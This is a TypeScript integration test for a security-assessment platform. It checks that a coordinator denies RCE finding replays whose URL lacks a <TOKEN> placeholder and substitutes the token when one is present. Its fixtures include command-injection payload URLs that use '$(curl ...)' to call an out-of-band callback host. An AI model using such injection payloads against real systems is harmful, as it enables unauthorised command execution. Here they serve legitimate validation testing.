// Sprint 20 codex HIGH/P1 — coordinator-side RCE token placement integration test.
//
// Verifies that startDecepticonSession:
//   1. Rejects RCE candidates whose affectedUrl lacks a <TOKEN> placeholder.
//      Emits validator.rce.replay_denied with reason:token_placeholder_missing.
//      Does NOT publish a validator.rce.replay envelope.
//   2. Correctly substitutes <TOKEN> in affectedUrl when placeholder is present.
//      Publishes validator.rce.replay envelope whose payload.affectedUrl contains the token.

import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from 'bun:test';
import { rmSync } from 'node:fs';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type {
  Artifact,
  CandidateFinding,
  DecepticonAdapter,
  SessionHandle,
  StartSessionInput,
  StatusEvent,
} from '@cyberstrike/decepticon-adapter';
import { type JobEnvelope, LocalQueueAdapter } from '@cyberstrike/queue';
import { DEFAULT_PLATFORM_POLICY, buildEffectiveScope } from '@cyberstrike/scope-engine';
import { startDecepticonSession } from '../../../apps/api/src/scope-engine/start-decepticon-session.ts';
import { hasDatabaseUrl, resetAuthState } from '../auth/helpers/auth-fixture.ts';
import {
  type DbFixture,
  applyAllMigrations,
  createFixture,
  dropAllTables,
  seedAssessment,
  seedProject,
  seedTarget,
} from '../db/helpers/db-fixture.ts';
import { buildLocalObjectStorage, uniqUuid } from './helpers.ts';

const VALID_TRACE = '0123456789abcdef0123456789abcdef';

// Minimal synchronous fake adapter — streams one RCE candidate with configurable affectedUrl.
class RceCandidateAdapter implements DecepticonAdapter {
  private readonly _affectedUrl: string;

  constructor(affectedUrl: string) {
    this._affectedUrl = affectedUrl;
  }

  async start(input: StartSessionInput): Promise<SessionHandle> {
    return {
      sessionId: crypto.randomUUID(),
      assessmentId: input.opplan.assessmentId,
      tenantId: input.tenantId,
      startedAt: new Date().toISOString(),
    };
  }

  streamStatus(_sessionId: string): AsyncIterable<StatusEvent> {
    return (async function* () {
      yield {
        sessionId: _sessionId,
        status: 'completed' as const,
        occurredAt: new Date().toISOString(),
      };
    })();
  }

  streamCandidates(sessionId: string): AsyncIterable<CandidateFinding> {
    const url = this._affectedUrl;
    return (async function* () {
      yield {
        candidateId: crypto.randomUUID(),
        sessionId,
        type: 'rce' as const,
        severity: 'high' as const,
        affectedUrl: url,
        source: 'decepticon.detector',
        payload: {},
        observedAt: new Date().toISOString(),
      };
    })();
  }

  async pause(_sessionId: string): Promise<void> {}
  async resume(_sessionId: string): Promise<void> {}
  async stop(_sessionId: string): Promise<void> {}
  async exportArtifacts(_sessionId: string): Promise<readonly Artifact[]> {
    return [];
  }
}

describe.skipIf(!hasDatabaseUrl())(
  'coordinator :: RCE token placement — <TOKEN> placeholder (codex HIGH/P1)',
  () => {
    let fx: DbFixture;
    let queueDir: string;
    let queueAdapter: LocalQueueAdapter;
    let tenantId: string;

    beforeAll(async () => {
      fx = await createFixture();
      await dropAllTables(fx);
      await applyAllMigrations(fx);
    });

    afterAll(async () => {
      await resetAuthState(fx.db);
      await dropAllTables(fx);
      await fx.db.destroy();
    });

    beforeEach(async () => {
      await resetAuthState(fx.db);
      queueDir = mkdtempSync(join(tmpdir(), 'cs-rce-token-q-'));
      queueAdapter = new LocalQueueAdapter({ db: fx.db, baseDir: queueDir });
      tenantId = uniqUuid();
      await fx.db
        .insertInto('tenants')
        .values({ id: tenantId, slug: `t-${tenantId.slice(0, 8)}`, name: 't' })
        .execute();
    });

    afterEach(() => {
      rmSync(queueDir, { recursive: true, force: true });
    });

    test('RCE candidate without <TOKEN> → replay_denied audit (token_placeholder_missing), no envelope published', async () => {
      const userId = uniqUuid();
      await fx.db
        .insertInto('users')
        .values({
          id: userId,
          tenant_id: tenantId,
          email: `u-rce-noplac-${userId.slice(0, 8)}@example.com`,
          display_name: `u-rce-noplac-${userId.slice(0, 8)}`,
          status: 'active',
          role: 'security_lead',
          password_hash: 'x',
        })
        .execute();

      const projectId = await seedProject(fx, { tenantId, name: 'P-rce-noplac' });
      const targetId = await seedTarget(fx, {
        tenantId,
        projectId,
        kind: 'url',
        value: 'http://rce-noplac.lab.local/',
        ownershipStatus: 'verified',
      });
      const assessmentId = await seedAssessment(fx, {
        tenantId,
        projectId,
        createdBy: userId,
        state: 'running',
        targetIds: [targetId],
      });

      // affectedUrl has NO <TOKEN> placeholder — coordinator must reject.
      const badUrl = 'http://rce-noplac.lab.local/api?cmd=$(curl http://oob.lab.internal/cb)';
      const adapter = new RceCandidateAdapter(badUrl);

      const scope = buildEffectiveScope({
        tenantId,
        assessmentId,
        tenantPolicy: { tenantId },
        platformPolicy: DEFAULT_PLATFORM_POLICY,
        rawRules: [
          {
            id: 'r1',
            ruleKind: 'domain',
            effect: 'allow',
            payload: { pattern: 'rce-noplac.lab.local', matchSubdomains: false },
          },
          { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
          { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
          { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
          { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
        ],
        toolCatalog: new Map(),
        assessmentFlags: {
          highImpactCategories: [],
          ownershipVerifiedTargetIds: new Set([targetId]),
        },
        timeWindow: null,
      });

      const { storage, baseDir: storageDir } = buildLocalObjectStorage();

      const parentEnvelope: JobEnvelope = {
        jobId: uniqUuid(),
        tenantId,
        projectId,
        assessmentId,
        kind: 'assessment.start',
        idempotencyKey: `assessment.start:noplac-${assessmentId}`,
        createdAt: new Date().toISOString(),
        attempt: 0,
        maxAttempts: 3,
        traceId: VALID_TRACE,
        payload: { assessmentId, targetIds: [targetId] },
      };

      await startDecepticonSession(
        {
          db: fx.db,
          adapter,
          objectStorage: storage,
          queueAdapter,
          randomHex8: () => 'aabbccdd',
        },
        {
          tenantId,
          projectId,
          assessmentId,
          scope,
          traceId: VALID_TRACE,
          parentEnvelope,
        },
      );

      rmSync(storageDir, { recursive: true, force: true });

      // No validator.rce.replay envelope published.
      const queueItems = await fx.db
        .selectFrom('jobs')
        .select(['kind'])
        .where('tenant_id', '=', tenantId)
        .where('kind', '=', 'validator.rce.replay')
        .execute();
      expect(queueItems.length).toBe(0);

      // validator.rce.replay_denied audit emitted with reason:token_placeholder_missing.
      const deniedAudits = await fx.db
        .selectFrom('audit_events')
        .selectAll()
        .where('tenant_id', '=', tenantId)
        .where('action', '=', 'validator.rce.replay_denied')
        .execute();
      expect(deniedAudits.length).toBeGreaterThanOrEqual(1);
      const deniedAfter = deniedAudits[0]?.after_state as Record<string, unknown> | null;
      expect(deniedAfter?.reason).toBe('token_placeholder_missing');
    });

    test('RCE candidate with <TOKEN> placeholder → coordinator substitutes token, envelope published with token in affectedUrl', async () => {
      const userId = uniqUuid();
      await fx.db
        .insertInto('users')
        .values({
          id: userId,
          tenant_id: tenantId,
          email: `u-rce-plac-${userId.slice(0, 8)}@example.com`,
          display_name: `u-rce-plac-${userId.slice(0, 8)}`,
          status: 'active',
          role: 'security_lead',
          password_hash: 'x',
        })
        .execute();

      const projectId = await seedProject(fx, { tenantId, name: 'P-rce-plac' });
      const targetId = await seedTarget(fx, {
        tenantId,
        projectId,
        kind: 'url',
        value: 'http://rce-plac.lab.local/',
        ownershipStatus: 'verified',
      });
      const assessmentId = await seedAssessment(fx, {
        tenantId,
        projectId,
        createdBy: userId,
        state: 'running',
        targetIds: [targetId],
      });

      // affectedUrl has <TOKEN> placeholder — coordinator must substitute.
      const templateUrl =
        'http://rce-plac.lab.local/api?cmd=$(curl http://oob.lab.internal/<TOKEN>/cb)';
      const adapter = new RceCandidateAdapter(templateUrl);

      const scope = buildEffectiveScope({
        tenantId,
        assessmentId,
        tenantPolicy: { tenantId },
        platformPolicy: DEFAULT_PLATFORM_POLICY,
        rawRules: [
          {
            id: 'r1',
            ruleKind: 'domain',
            effect: 'allow',
            payload: { pattern: 'rce-plac.lab.local', matchSubdomains: false },
          },
          { id: 'r2', ruleKind: 'protocol', effect: 'allow', payload: { protocol: 'http' } },
          { id: 'r3', ruleKind: 'port', effect: 'allow', payload: { port: 80 } },
          { id: 'r4', ruleKind: 'http_method', effect: 'allow', payload: { method: 'GET' } },
          { id: 'r5', ruleKind: 'path_pattern', effect: 'allow', payload: { glob: '/**' } },
        ],
        toolCatalog: new Map(),
        assessmentFlags: {
          highImpactCategories: [],
          ownershipVerifiedTargetIds: new Set([targetId]),
        },
        timeWindow: null,
      });

      const { storage, baseDir: storageDir } = buildLocalObjectStorage();
      const fixedHex = 'deadbeef';

      const parentEnvelope: JobEnvelope = {
        jobId: uniqUuid(),
        tenantId,
        projectId,
        assessmentId,
        kind: 'assessment.start',
        idempotencyKey: `assessment.start:plac-${assessmentId}`,
        createdAt: new Date().toISOString(),
        attempt: 0,
        maxAttempts: 3,
        traceId: VALID_TRACE,
        payload: { assessmentId, targetIds: [targetId] },
      };

      await startDecepticonSession(
        {
          db: fx.db,
          adapter,
          objectStorage: storage,
          queueAdapter,
          randomHex8: () => fixedHex,
        },
        {
          tenantId,
          projectId,
          assessmentId,
          scope,
          traceId: VALID_TRACE,
          parentEnvelope,
        },
      );

      rmSync(storageDir, { recursive: true, force: true });

      // validator.rce.replay envelope published.
      const queueItems = await fx.db
        .selectFrom('jobs')
        .selectAll()
        .where('tenant_id', '=', tenantId)
        .where('kind', '=', 'validator.rce.replay')
        .execute();
      expect(queueItems.length).toBe(1);

      // payload.affectedUrl must NOT contain literal '<TOKEN>' — it must be substituted.
      // jobs.payload stores JSON.stringify(JobEnvelope); inner .payload is the envelope payload.
      const rawEnvelope =
        typeof queueItems[0]?.payload === 'string'
          ? (JSON.parse(queueItems[0].payload) as Record<string, unknown>)
          : (queueItems[0]?.payload as Record<string, unknown> | null);
      const rcePayload = rawEnvelope?.payload as Record<string, unknown> | null;
      expect(typeof rcePayload?.affectedUrl).toBe('string');
      const publishedUrl = String(rcePayload?.affectedUrl ?? '');
      expect(publishedUrl).not.toContain('<TOKEN>');
      // Token (candidate_finding_id.tenant_id.deadbeef) must appear in the URL.
      expect(publishedUrl).toContain(fixedHex);
    });
  },
);
